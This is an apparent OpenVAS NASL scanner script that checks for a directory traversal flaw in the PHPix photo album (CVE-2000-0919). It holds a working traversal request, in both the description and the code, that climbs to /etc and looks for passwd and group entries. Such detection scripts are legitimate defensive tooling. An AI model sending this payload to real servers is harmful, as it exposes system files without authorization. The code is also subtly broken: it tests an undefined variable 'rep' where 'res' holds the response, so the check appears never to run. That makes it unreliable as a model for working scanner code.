# SPDX-FileCopyrightText: 2005 Zorgon <zorgon@linuxstart.com>
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10574");
  script_version("2023-08-03T05:05:16+0000");
  script_tag(name:"last_modification", value:"2023-08-03 05:05:16 +0000 (Thu, 03 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/1773");
  script_cve_id("CVE-2000-0919");
  script_name("PHPix Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 Zorgon <zorgon@linuxstart.com>");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"PHPix is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"PHPix allows an attacker to read arbitrary files on the remote
  web server, prefixing the path name of the file with '..%2F..%2F..'. As an example the following:

  GET /Album/?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0

  will return all the files that are nested within /etc directory.");

  script_tag(name:"solution", value:"Contact your vendor for the latest software release.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

url = string("/Album/?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0");
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req);
if(!rep)
  exit(0);

if("Prev 20" >< res && "group" >< res && "passwd" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
